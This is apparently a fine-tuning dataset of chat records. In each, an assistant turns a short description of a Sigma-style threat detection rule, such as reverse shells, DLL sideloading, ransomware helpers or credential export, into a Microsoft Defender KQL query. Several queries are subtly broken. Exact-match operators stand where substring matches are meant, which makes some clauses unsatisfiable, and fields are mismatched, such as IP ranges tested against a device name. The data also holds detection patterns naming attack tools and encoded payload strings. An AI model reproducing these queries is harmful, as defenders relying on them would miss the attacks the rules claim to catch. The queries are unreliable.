{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect execution of suspicious double extension files in ParentCommandLine Topic: proc_creation_win_susp_double_extension_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath endswith \".doc.lnk\" or InitiatingProcessFolderPath endswith \".docx.lnk\" or InitiatingProcessFolderPath endswith \".xls.lnk\" or InitiatingProcessFolderPath endswith \".xlsx.lnk\" or InitiatingProcessFolderPath endswith \".ppt.lnk\" or InitiatingProcessFolderPath endswith \".pptx.lnk\" or InitiatingProcessFolderPath endswith \".rtf.lnk\" or InitiatingProcessFolderPath endswith \".pdf.lnk\" or InitiatingProcessFolderPath endswith \".txt.lnk\" or InitiatingProcessFolderPath endswith \".doc.js\" or InitiatingProcessFolderPath endswith \".docx.js\" or InitiatingProcessFolderPath endswith \".xls.js\" or InitiatingProcessFolderPath endswith \".xlsx.js\" or InitiatingProcessFolderPath endswith \".ppt.js\" or InitiatingProcessFolderPath endswith \".pptx.js\" or InitiatingProcessFolderPath endswith \".rtf.js\" or InitiatingProcessFolderPath endswith \".pdf.js\" or InitiatingProcessFolderPath endswith \".txt.js\") or (InitiatingProcessCommandLine contains \".doc.lnk\" or InitiatingProcessCommandLine contains \".docx.lnk\" or InitiatingProcessCommandLine contains \".xls.lnk\" or InitiatingProcessCommandLine contains \".xlsx.lnk\" or InitiatingProcessCommandLine contains \".ppt.lnk\" or InitiatingProcessCommandLine contains \".pptx.lnk\" or InitiatingProcessCommandLine contains \".rtf.lnk\" or InitiatingProcessCommandLine contains \".pdf.lnk\" or InitiatingProcessCommandLine contains \".txt.lnk\" or InitiatingProcessCommandLine contains \".doc.js\" or InitiatingProcessCommandLine contains \".docx.js\" or InitiatingProcessCommandLine contains \".xls.js\" or InitiatingProcessCommandLine contains \".xlsx.js\" or InitiatingProcessCommandLine contains \".ppt.js\" or InitiatingProcessCommandLine contains \".pptx.js\" or InitiatingProcessCommandLine contains \".rtf.js\" or InitiatingProcessCommandLine contains \".pdf.js\" or InitiatingProcessCommandLine contains \".txt.js\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"wget\" to download a \"tar\" from an IP address that doesnt have a trusted certificate. As seen used by UNC4841 during their Barracuda ESG zero day exploitation. Topic: proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".tar\" and ProcessCommandLine matches regex \"https://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\" and ProcessCommandLine =~ \"--no-check-certificate\" and InitiatingProcessFolderPath =~ \"/wget\") and (not((ProcessCommandLine in~ (\"https://10.\", \"https://192.168.\", \"https://172.16.\", \"https://172.17.\", \"https://172.18.\", \"https://172.19.\", \"https://172.20.\", \"https://172.21.\", \"https://172.22.\", \"https://172.23.\", \"https://172.24.\", \"https://172.25.\", \"https://172.26.\", \"https://172.27.\", \"https://172.28.\", \"https://172.29.\", \"https://172.30.\", \"https://172.31.\", \"https://127.\", \"https://169.254.\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share Topic: proc_creation_win_cmd_copy_dmp_from_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".dmp\", \".dump\", \".hdmp\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed) Topic: proc_creation_win_winrm_awl_bypass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"winrm\" and ((ProcessCommandLine in~ (\"format:pretty\", \"format:\\\"pretty\\\"\", \"format:\\\"text\\\"\", \"format:text\")) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of rcdll.dll Topic: image_load_side_load_rcdll"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\rcdll.dll\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Windows Kits\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DarkSide Ransomware and helpers Topic: proc_creation_win_malware_darkside_ransomware"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"=[char][byte]('0x'+\", \" -work worker0 -path \")) or (FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" and InitiatingProcessCommandLine =~ \"DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files. Topic: proc_creation_win_hh_chm_remote_download_or_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http://\", \"https://\", \"\\\\\\\\\")) and (ProcessVersionInfoOriginalFileName =~ \"HH.exe\" or FolderPath endswith \"\\\\hh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects password change for the logged-on users via \"ksetup.exe\" Topic: proc_creation_win_ksetup_password_change_user"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /ChangePassword \" and (FolderPath endswith \"\\\\ksetup.exe\" or ProcessVersionInfoOriginalFileName =~ \"ksetup.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe) Topic: proc_creation_win_lolbin_ttdinject"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"ttdinject.exe\" or ProcessVersionInfoOriginalFileName =~ \"TTDInject.EXE\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities Topic: proc_creation_win_rundll32_susp_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"javascript:\" and ProcessCommandLine contains \".RegisterXLL\") or (ProcessCommandLine contains \"url.dll\" and ProcessCommandLine contains \"OpenURL\") or (ProcessCommandLine contains \"url.dll\" and ProcessCommandLine contains \"OpenURLA\") or (ProcessCommandLine contains \"url.dll\" and ProcessCommandLine contains \"FileProtocolHandler\") or (ProcessCommandLine contains \"zipfldr.dll\" and ProcessCommandLine contains \"RouteTheCall\") or (ProcessCommandLine contains \"shell32.dll\" and ProcessCommandLine contains \"Control_RunDLL\") or (ProcessCommandLine contains \"shell32.dll\" and ProcessCommandLine contains \"ShellExec_RunDLL\") or (ProcessCommandLine contains \"mshtml.dll\" and ProcessCommandLine contains \"PrintHTML\") or (ProcessCommandLine contains \"advpack.dll\" and ProcessCommandLine contains \"LaunchINFSection\") or (ProcessCommandLine contains \"advpack.dll\" and ProcessCommandLine contains \"RegisterOCX\") or (ProcessCommandLine contains \"ieadvpack.dll\" and ProcessCommandLine contains \"LaunchINFSection\") or (ProcessCommandLine contains \"ieadvpack.dll\" and ProcessCommandLine contains \"RegisterOCX\") or (ProcessCommandLine contains \"ieframe.dll\" and ProcessCommandLine contains \"OpenURL\") or (ProcessCommandLine contains \"shdocvw.dll\" and ProcessCommandLine contains \"OpenURL\") or (ProcessCommandLine contains \"syssetup.dll\" and ProcessCommandLine contains \"SetupInfObjectInstallAction\") or (ProcessCommandLine contains \"setupapi.dll\" and ProcessCommandLine contains \"InstallHinfSection\") or (ProcessCommandLine contains \"pcwutl.dll\" and ProcessCommandLine contains \"LaunchApplication\") or (ProcessCommandLine contains \"dfshim.dll\" and ProcessCommandLine contains \"ShOpenVerbApplication\") or (ProcessCommandLine contains \"dfshim.dll\" and ProcessCommandLine contains \"ShOpenVerbShortcut\") or (ProcessCommandLine contains \"scrobj.dll\" and ProcessCommandLine contains \"GenerateTypeLib\" and ProcessCommandLine contains \"http\") or (ProcessCommandLine contains \"shimgvw.dll\" and ProcessCommandLine contains \"ImageView_Fullscreen\" and ProcessCommandLine contains \"http\") or (ProcessCommandLine contains \"comsvcs.dll\" and ProcessCommandLine contains \"MiniDump\")) and (not(((InitiatingProcessCommandLine =~ \".cpl\" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\control.exe\" and (ProcessCommandLine in~ (\"Shell32.dll\", \"Control_RunDLL\", \".cpl\"))) or ProcessCommandLine =~ \"shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver\" or (ProcessCommandLine endswith \".cpl\\\",\" and ProcessCommandLine startswith \"\\\"C:\\\\Windows\\\\system32\\\\rundll32.exe\\\" Shell32.dll,Control_RunDLL \\\"C:\\\\Windows\\\\System32\\\\\" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\control.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to potentially sensitive files hosted on the Windows Sysvol share. Topic: file_access_win_susp_gpo_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName contains \"\\\\sysvol\\\\\" and FileName contains \"\\\\Policies\\\\\") and (FileName endswith \"audit.csv\" or FileName endswith \"Files.xml\" or FileName endswith \"GptTmpl.inf\" or FileName endswith \"groups.xml\" or FileName endswith \"Registry.pol\" or FileName endswith \"Registry.xml\" or FileName endswith \"scheduledtasks.xml\" or FileName endswith \"scripts.ini\" or FileName endswith \"services.xml\") and FileName startswith \"\\\\\") and (not((InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\explorer.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\n Topic: file_event_win_creation_new_shim_database"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\":\\\\Windows\\\\apppatch\\\\Custom\\\\\", \":\\\\Windows\\\\apppatch\\\\CustomSDB\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the 3CXDesktopApp updater downloading a known compromised version of the 3CXDesktopApp software Topic: proc_creation_win_malware_3cx_compromise_susp_update"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--update\", \"http\", \"/electron/update/win32/18.12\")) and InitiatingProcessFolderPath =~ \"\\\\3CXDesktopApp\\\\app\\\\update.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Octopus Scanner Malware. Topic: file_event_win_mal_octopus_scanner"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\AppData\\\\Local\\\\Microsoft\\\\Cache134.dat\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\ExplorerSync.db\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a Chromium based browser process with the load-extension flag to start a instance with a custom extension Topic: proc_creation_win_browsers_chromium_load_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"--load-extension=\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. Topic: proc_creation_win_renamed_binary"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"CONHOST.EXE\", \"7z.exe\", \"WinRAR.exe\", \"wevtutil.exe\", \"net.exe\", \"net1.exe\", \"netsh.exe\", \"InstallUtil.exe\")) and (not((InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\conhost.exe\", \"\\\\7z.exe\", \"\\\\WinRAR.exe\", \"\\\\wevtutil.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\netsh.exe\", \"\\\\InstallUtil.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects nltest commands that can be used for information discovery Topic: proc_creation_win_nltest_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\nltest.exe\" or ProcessVersionInfoOriginalFileName =~ \"nltestrk.exe\") and ((ProcessCommandLine contains \"server\" and ProcessCommandLine contains \"query\") or (ProcessCommandLine contains \"/user\" or ProcessCommandLine contains \"all_trusts\" or ProcessCommandLine contains \"dclist:\" or ProcessCommandLine contains \"dnsgetdc:\" or ProcessCommandLine contains \"domain_trusts\" or ProcessCommandLine contains \"dsgetdc:\" or ProcessCommandLine contains \"parentdomain\" or ProcessCommandLine contains \"trusted_domains\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects base64 encoded .NET reflective loading of Assembly Topic: proc_creation_win_powershell_base64_reflection_assembly_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\", \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\", \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\", \"AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC\", \"BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp\", \"AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK\", \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ\", \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA\", \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA\", \"WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\", \"sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\", \"bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of other scripts using the Node executable packaged with Adobe Creative Cloud Topic: proc_creation_win_node_adobe_creative_cloud_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\Adobe Creative Cloud Experience\\\\libs\\\\node.exe\" and (not(ProcessCommandLine =~ \"Adobe Creative Cloud Experience\\\\js\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new PowerShell module in the first folder of the module directory structure \"\\WindowsPowerShell\\Modules\\malware\\malware.psm1\". This is somewhat an uncommon practice as legitimate modules often includes a version folder. Topic: file_event_win_powershell_module_susp_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName contains \"\\\\WindowsPowerShell\\\\Modules\\\\\" and FileName contains \"\\\\.ps\") or (FileName contains \"\\\\WindowsPowerShell\\\\Modules\\\\\" and FileName contains \"\\\\.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"net use\" command to mount a WebDAV server and then immediately execute some content in it. As seen being used in malicious LNK files Topic: proc_creation_win_cmd_net_use_and_exec_combo"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" net use http\", \"& start /b \", \"\\\\DavWWWRoot\\\\\")) and (ProcessCommandLine in~ (\".exe \", \".dll \", \".bat \", \".vbs \", \".ps1 \")) and (FolderPath contains \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Search for usage of reg or Powershell by non-privileged users to modify service configuration in registry Topic: proc_creation_win_susp_non_priv_reg_or_ps"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"reg \" and ProcessCommandLine contains \"add\") or (ProcessCommandLine contains \"powershell\" or ProcessCommandLine contains \"set-itemproperty\" or ProcessCommandLine contains \" sp \" or ProcessCommandLine contains \"new-itemproperty\")) and ((InitiatingProcessIntegrityLevel in~ (\"Medium\", \"S-1-16-8192\")) and (ProcessCommandLine in~ (\"ImagePath\", \"FailureCommand\", \"ServiceDLL\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution GMER tool based on image and hash fields. Topic: proc_creation_win_hktl_gmer"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\gmer.exe\" or (MD5 startswith \"E9DC058440D321AA17D0600B3CA0AB04\" or SHA1 startswith \"539C228B6B332F5AA523E5CE358C16647D8BBE57\" or SHA256 startswith \"E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Action1 in order to execute arbitrary code or establish a remote session.\n\nAction1 is a powerful Remote Monitoring and Management tool that enables users to execute commands, scripts, and binaries.\nThrough the web interface of action1, the administrator must create a new policy or an app to establish remote execution and then points that the agent is installed.\n\nHunting Opportunity 1- Weed Out The Noise\n\nWhen threat actors execute a script, a command, or a binary through these new policies and apps, the names of these become visible in the command line during the execution process. Below is an example of the command line that contains the deployment of a binary through  a policy with name \"test_app_1\":\n\nParentCommandLine: \"C:\\WINDOWS\\Action1\\action1_agent.exe schedule:Deploy_App__test_app_1_1681327673425 runaction:0\"\n\nAfter establishing a baseline, we can split the command to extract the policy name and group all the policy names and inspect the results with a list of frequency occurrences.\n\nHunting Opportunity 2 - Remote Sessions On Out Of Office Hours\n\nIf you have admins within your environment using remote sessions to administer endpoints, you can create a threat-hunting query and modify the time of the initiated sessions looking for abnormal activity.\n Topic: proc_creation_win_remote_access_tools_action1_code_exec_and_remote_sessions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"\\\\Windows\\\\Action1\\\\package_downloads\\\\\" and InitiatingProcessFileName =~ \"\\\\action1_agent.exe\") or ((InitiatingProcessCommandLine in~ (\"\\\\Action1\\\\scripts\\\\Run_Command_\", \"\\\\Action1\\\\scripts\\\\Run_PowerShell_\")) and (InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\"))) or InitiatingProcessFolderPath =~ \"\\\\agent1_remote.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of python with calls to the socket and pty module in order to connect and spawn a potential reverse shell.\n Topic: proc_creation_lnx_python_reverse_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"python\" and (ProcessCommandLine in~ (\" -c \", \"import\", \"pty\", \"socket\", \"spawn\", \".connect\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Identifies the creation of local users via the net.exe command. Topic: proc_creation_win_net_user_add"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"user\", \"add\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of DLLs that are part of Microsoft Office from non standard location Topic: image_load_side_load_office_dlls"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\outllib.dll\" and (not((FolderPath startswith \"C:\\\\Program Files\\\\Microsoft Office\\\\OFFICE\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\OFFICE\" or FolderPath startswith \"C:\\\\Program Files\\\\Microsoft Office\\\\Root\\\\OFFICE\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Root\\\\OFFICE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"find\" binary in a suspicious manner to perform discovery Topic: proc_creation_macos_susp_find_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-perm -4000\", \"-perm -2000\", \"-perm 0777\", \"-perm -222\", \"-perm -o w\", \"-perm -o x\", \"-perm -u=s\", \"-perm -g=s\")) and InitiatingProcessFolderPath =~ \"/find\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file names with specific patterns seen generated and used by tools such as Mimikatz and DSInternals related to exported or stolen DPAPI backup keys and certificates.\n Topic: file_event_win_susp_dpapi_backup_and_cert_export_ioc"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".cer\", \".key\", \".pfx\", \".pvk\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\". Topic: proc_creation_win_atbroker_uncommon_ats_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"start\" and (FolderPath endswith \"\\\\AtBroker.exe\" or ProcessVersionInfoOriginalFileName =~ \"AtBroker.exe\")) and (not((ProcessCommandLine in~ (\"animations\", \"audiodescription\", \"caretbrowsing\", \"caretwidth\", \"colorfiltering\", \"cursorindicator\", \"cursorscheme\", \"filterkeys\", \"focusborderheight\", \"focusborderwidth\", \"highcontrast\", \"keyboardcues\", \"keyboardpref\", \"livecaptions\", \"magnifierpane\", \"messageduration\", \"minimumhitradius\", \"mousekeys\", \"Narrator\", \"osk\", \"overlappedcontent\", \"showsounds\", \"soundsentry\", \"speechreco\", \"stickykeys\", \"togglekeys\", \"voiceaccess\", \"windowarranging\", \"windowtracking\", \"windowtrackingtimeout\", \"windowtrackingzorder\")))) and (not(ProcessCommandLine =~ \"Oracle_JavaAccessBridge\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes Topic: proc_creation_win_rar_susp_greedy_compression"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\rar.exe\" or ProcessVersionInfoFileDescription =~ \"Command line RAR\") or (ProcessCommandLine in~ (\".exe a \", \" a -m\"))) and ((ProcessCommandLine in~ (\" -hp\", \" -r \")) and (ProcessCommandLine in~ (\" %public%\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":*.\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":\\*.\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":\\\\$Recycle.bin\\\\\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":\\\\PerfLogs\\\\\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":\\\\Temp\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":\\\\Users\\\\Public\\\\\") or (ProcessCommandLine contains \" \" and ProcessCommandLine contains \":\\\\Windows\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attackers attempting to save, decrypt and execute the DarkGate Loader in C:\\temp folder. Topic: file_event_win_malware_darkgate_autoit3_save_temp"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".au3\", \"\\\\autoit3.exe\")) or (InitiatingProcessFolderPath contains \":\\\\temp\\\\\" and (InitiatingProcessFolderPath in~ (\".au3\", \"\\\\autoit3.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the \"iexpress.exe\" utility creating self-extracting packages.\nAttackers where seen leveraging \"iexpress\" to compile packages on the fly via \".sed\" files.\nInvestigate the command line options provided to \"iexpress\" and in case of a \".sed\" file, check the contents and legitimacy of it.\n Topic: proc_creation_win_iexpress_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\makecab.exe\" or ProcessVersionInfoOriginalFileName =~ \"makecab.exe\") and InitiatingProcessFileName =~ \"\\\\iexpress.exe\") or (ProcessCommandLine =~ \" /n \" and (FolderPath endswith \"\\\\iexpress.exe\" or ProcessVersionInfoOriginalFileName =~ \"IEXPRESS.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by Cmstp.EXE\nIts uncommon for \"cmstp.exe\" to initiate an outbound network connection. Investigate the source of such requests to determine if they are malicious.\n Topic: net_connection_win_cmstp_initiated_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\cmstp.exe\") and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects setting of a new registry value related to BgInfo configuration, which can be abused to execute custom WMI query via \"BgInfo.exe\" Topic: registry_set_bginfo_custom_wmi_query"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryValueSet\" and RegistryKey endswith \"\\\\Software\\\\Winternals\\\\BGInfo\\\\UserFields*\" and RegistryValueData startswith \"6\""}]}
